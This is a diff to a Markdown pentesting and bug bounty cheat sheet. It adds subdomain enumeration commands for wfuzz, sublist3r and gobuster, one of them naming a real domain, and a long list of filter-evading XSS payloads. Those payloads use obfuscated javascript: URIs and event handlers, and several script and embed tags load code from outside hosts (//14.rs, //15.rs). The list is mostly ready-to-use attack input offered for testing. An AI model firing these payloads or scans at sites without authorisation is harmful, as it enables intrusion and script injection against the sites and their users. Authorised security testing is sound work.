@@ -17,6 +17,8 @@
 
 
 ### BugBounty
+  - [Basic enumeration](#basic-enumeration)
+     - [find subdomains](#find-subdomains)
   - [Bypass file upload filtering](#bypass-file-upload-filtering)
   - [Open redirect](#open-web-redirect)
   - [PHP filter](#php-filters-for-lfi)
@@ -43,6 +45,47 @@
   - [LXC/LXD container](#lxclxd-privilege-escalation)
   - [Perl setuid capability](#perl-setuid-capability-privesc)
 -------------------------------------------------------------------------------------------------------------
+# Basic Enumeration
+
+### Find Subdomains
+
+#### `wfuzz`
+
+```
+sudo wfuzz -c -f sub-fighter.txt -Z -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --sc 200,202,204,301,302,307,403 <targetURL>
+```
+
+Now you may get a ton of output that shows valid subdomains depending on how the site is configured. If you notice a large amount of results that contain the same word count, this may just be an indication that the site returns a 200 response, but it just displays a “Not found” error.
+
+<img src=https://infiniteloginscom.files.wordpress.com/2020/09/image-1.png>
+
+To remove results with a specific word count, you can append your command w/ --hw <value>. For example, our new command that removes results that respond w/ a word count of 290 would look like the following:
+
+```
+wfuzz -c -f sub-fighter -w top5000.txt -u 'http://target.tld' -H "Host: FUZZ.target.tld" --hw 290
+```
+
+
+ ### `sublist3r`
+ 
+  with sublist3r it is simple as
+  
+  ```
+  sublist3r -d <domian name>
+  ```
+ 
+### `gobuster`
+  
+`dns`
+```
+gobuster dns -d erev0s.com -w awesome_wordlist.txt -i
+```
+ `vhost`
+```
+gobuster vhost -u erev0s.com -w awesome_wordlist.txt -v
+```
+
+-----------------------------------------------------------------------------------------------------------------
 # Bypass File Upload Filtering
 
 `GIF89a`
@@ -111,7 +154,7 @@ https://www.whitelisteddomain.tld@google.com/%2f..
 -------------------------------------------------------------------------------------------------------------
 
 # XSS common payloads
-```
+```xml
 <img src=x>
 <script>alert('XSS')</script>
 "><script>alert('XSS')</script>
@@ -121,6 +164,27 @@ https://www.whitelisteddomain.tld@google.com/%2f..
 <img src="javascript:alert(1)">
 <image src="javascript:alert(1)">
 <script src="javascript:alert(1)">
+<A/hREf="j%0aavas%09cript%0a:%09con%0afirm%0d``">z
+<d3"<"/onclick="1>[confirm``]"<">z
+<d3/onmouseenter=[2].find(confirm)>z
+<details open ontoggle=confirm()>
+<script y="><">/*<script* */prompt()</script
+<w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
+<a href="javascript%26colon;alert(1)">click
+<a href=javas&#99;ript:alert(1)>click
+<script/"<a"/src=data:=".<a,[8].some(confirm)>
+<svg/x=">"/onload=confirm()//
+<--`<img/src=` onerror=confirm``> --!>
+<svg%0Aonload=%09((pro\u006dpt))()//
+<sCript x>(((confirm)))``</scRipt x>
+<svg </onload ="1> (_=prompt,_(1)) "">
+<!--><script src=//14.rs>
+<embed src=//14.rs>
+<script x=">" src=//15.rs></script>
+<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
+<iframe/src \/\/onload = prompt(1)
+<x oncut=alert()>x
+<svg onload=write()>
 ```
 
 --------------------------------------------------------------------------------------------------------------
